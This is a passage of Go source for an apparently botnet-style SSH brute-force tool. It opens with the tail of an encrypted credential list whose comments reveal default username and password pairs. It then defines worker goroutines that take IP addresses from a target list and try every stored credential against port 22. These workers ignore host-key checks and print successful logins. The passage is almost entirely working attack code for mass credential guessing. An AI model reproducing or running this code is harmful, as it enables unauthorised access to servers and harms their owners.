	68: "oVRGTE6vSfBmR0W6brTSlkgN80WN2q_-MSay-5uYiG9XW4LqH7n797uOp8K0w0Mc39yZZAKl34o6IjAtDl0XyoueEQK4UppbI9S5Ru49j0arvQ==||ib1jQ014XRw7JdIEeoGLspMvMleIXZov9UDJIt_OoA1NBdrxafXCDicWY2ZZ2D3Ej9oBfSAUSW7CGS9LPsOZyMT7HrLxulbGPhWb2EHaZ4C9E4s=",         //admin||meinsm
	69: "h8h84-Mbl2QBDd592ZoTTedGQvV8WRmnD8x_ImbpWYwc9_6D3TwXsak7eKihaiO65lWGrCxJBvtcs167qZ-d1yDKwGzsOfuWxG_AJxmQPQoohQ==||iB_FPXqEt9Lexsb0XA0e6wR5VCSrgg0AUxSqp33bC4_4IzivLK2crpuFfMo4RRT7O9jDhZnyvpUIa5npOIn2Uxl9G4c6qMuJHB5R5c2sfivIlHM=",         //admin||101101

}

// BruteForceWorkers ...
type BruteForceWorkers struct {
	StopProcess  *chan bool
	Workers      int
	SuccessLogin int64
	TotalTry     int64
}

// NewBruteForceWorker ...
func NewBruteForceWorker(workers int) (*BruteForceWorkers, error) {
	if workers < 1 {
		return nil, fmt.Errorf("Amount of workers cannot be less 1")
	}

	s := make(chan bool)
	return &BruteForceWorkers{
		StopProcess:  &s,
		Workers:      workers,
		SuccessLogin: 0,
		TotalTry:     0,
	}, nil
}

// Run ...
func (b *BruteForceWorkers) Run() {
	for i := 0; i < b.Workers; i++ {
		go func() {
			for {
				select {
				case <-(*b.StopProcess):
					return
				default:
					target := <-Utils.AccessIPList
					ipAddr := strings.Split(target, ":")
					if ipAddr[1] == "22" {
						for i := 0; i != len(Credentials); i++ {
							credentialsArray := strings.Split(Credentials[i], "||")
							config := &ssh.ClientConfig{
								User:            string(Security.Decrypt(credentialsArray[0], []byte(Configs.SecurityKey))),
								HostKeyCallback: ssh.InsecureIgnoreHostKey(),
								Auth:            []ssh.AuthMethod{ssh.Password(string(Security.Decrypt(credentialsArray[1], []byte(Configs.SecurityKey))))},
								Timeout:         time.Millisecond * 500,
							}

							if _, err := ssh.Dial("tcp", target, config); err == nil {
								if Configs.IsDebug {
									fmt.Printf("Login Success: %s : %s, %s\n", target, string(Security.Decrypt(credentialsArray[0], []byte(Configs.SecurityKey))), string(Security.Decrypt(credentialsArray[1], []byte(Configs.SecurityKey))))
								}
							} else {
								if Configs.IsDebug {
									fmt.Println(err.Error())
								}
							}
						}
					}
				}
				runtime.Gosched()
			}
		}()
	}
}
